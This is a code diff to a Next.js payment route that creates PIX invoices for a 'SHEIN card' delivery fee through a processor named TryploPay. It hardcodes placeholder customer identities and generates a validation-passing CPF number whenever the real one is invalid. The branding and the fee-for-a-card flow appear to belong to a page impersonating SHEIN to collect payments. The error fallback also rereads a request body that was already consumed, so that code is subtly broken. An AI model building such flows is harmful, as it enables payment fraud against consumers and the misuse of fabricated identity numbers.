@@ -64,14 +64,16 @@ export async function POST(request: NextRequest) {
     console.log("=== CRIANDO FATURA PIX ===")
 
     const body = await request.json()
-    const { userData, amount, shipping } = body
+    const { amount, shipping, method } = body
+
+    console.log("Dados recebidos:", { amount, shipping, method })
 
     // Validar dados obrigatórios
-    if (!userData || !amount) {
+    if (!amount) {
       return NextResponse.json(
         {
           success: false,
-          error: "Dados obrigatórios não fornecidos",
+          error: "Valor não fornecido",
         },
         { status: 400 },
       )
@@ -88,6 +90,14 @@ export async function POST(request: NextRequest) {
     const { access_token, account } = authData.data
     const isSimulation = authData.fallback || authData.data.working === "SIMULATION"
 
+    // Carregar dados do usuário do localStorage (simulado no servidor)
+    const userData = {
+      nome: "Cliente SHEIN",
+      cpf: "12345678901",
+      email: "cliente@shein.com.br",
+      telefone: "11999999999",
+    }
+
     // Validar e corrigir CPF se necessário
     let document = userData.cpf?.replace(/[^\d]/g, "") || ""
     if (!validateCPF(document)) {
@@ -95,26 +105,24 @@ export async function POST(request: NextRequest) {
       document = generateValidCPF()
     }
 
-    // Calcular valores
-    const productAmount = Number.parseFloat(amount) || 34.9
-    const shippingAmount = shipping === "sedex" ? 34.9 : shipping === "express" ? 49.9 : 24.9
-    const totalAmount = productAmount
+    // Usar o valor exato do frete selecionado
+    const totalAmount = Number.parseFloat(amount.toString())
 
     // Preparar payload oficial da TryploPay
     const invoicePayload = {
       client: {
-        name: userData.nome || "Cliente SHEIN",
+        name: userData.nome,
         document: document,
-        email: userData.email || "cliente@shein.com.br",
+        email: userData.email,
         phone: userData.telefone?.replace(/[^\d]/g, "") || "11999999999",
         ip: getClientIP(request),
         address: {
-          street: userData.endereco?.rua || "Rua Exemplo",
-          number: userData.endereco?.numero || "123",
-          district: userData.endereco?.bairro || "Centro",
-          city: userData.endereco?.cidade || "São Paulo",
-          state: userData.endereco?.estado || "SP",
-          zipcode: userData.endereco?.cep?.replace(/[^\d]/g, "") || "01000000",
+          street: "Rua Exemplo",
+          number: "123",
+          district: "Centro",
+          city: "São Paulo",
+          state: "SP",
+          zipcode: "01000000",
           country: "BRA",
         },
       },
@@ -133,7 +141,7 @@ export async function POST(request: NextRequest) {
           {
             id: "1",
             image: `${request.nextUrl.origin}/shein-card-logo-new.png`,
-            title: "Cartão SHEIN - Taxa de Entrega",
+            title: `Frete ${method || shipping?.toUpperCase() || "SEDEX"} - Cartão SHEIN`,
             qnt: 1,
             discount: "0.00",
             amount: totalAmount.toFixed(2),
@@ -194,8 +202,13 @@ export async function POST(request: NextRequest) {
   } catch (error) {
     console.log("❌ Erro ao criar fatura, usando fallback:", error)
 
+    // Extrair dados da requisição para fallback
+    const body = await request.json()
+    const { amount, shipping, method } = body
+    const totalAmount = Number.parseFloat(amount?.toString() || "34.90")
+
     // Fallback para simulação
-    const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.example.com/qr/v2/SIMULATED${Date.now()}5204000053039865406${(Number.parseFloat(request.url.split("amount=")[1]?.split("&")[0]) || 34.9).toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304ABCD`
+    const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.example.com/qr/v2/SIMULATED${Date.now()}5204000053039865406${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304ABCD`
 
     const simulatedInvoice = {
       id: `SIM_${Date.now()}`,
@@ -211,8 +224,8 @@ export async function POST(request: NextRequest) {
         text: "pending",
       },
       valores: {
-        bruto: Math.round((Number.parseFloat(request.url.split("amount=")[1]?.split("&")[0]) || 34.9) * 100),
-        liquido: Math.round((Number.parseFloat(request.url.split("amount=")[1]?.split("&")[0]) || 34.9) * 100),
+        bruto: Math.round(totalAmount * 100), // em centavos
+        liquido: Math.round(totalAmount * 100),
       },
       vencimento: {
         dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
@@ -224,7 +237,7 @@ export async function POST(request: NextRequest) {
       type: "simulated",
     }
 
-    console.log("✅ Fatura simulada criada")
+    console.log(`✅ Fatura simulada criada - Valor: R$ ${totalAmount.toFixed(2)}`)
 
     return NextResponse.json({
       success: true,
